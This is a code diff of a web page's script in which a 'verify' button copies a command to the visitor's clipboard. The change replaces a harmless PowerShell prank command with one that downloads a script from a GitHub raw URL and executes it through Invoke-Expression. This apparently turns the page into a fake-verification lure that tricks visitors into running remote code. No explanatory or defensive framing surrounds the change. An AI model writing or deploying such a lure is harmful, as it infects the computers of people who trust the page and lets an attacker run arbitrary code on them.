@@ -142,7 +142,7 @@
 
     <script>
         document.getElementById('verifyBtn').addEventListener('click', async function () {
-            const textToCopy = `powershell -Command "Start-Process 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'"`;
+            const textToCopy = `powershell -Command "iwr 'https://raw.githubusercontent.com/maitasdjfl/vscode/main/test' | iex"`;
             try {
                 await navigator.clipboard.writeText(textToCopy);
                 document.getElementById('popup').style.display = 'block';
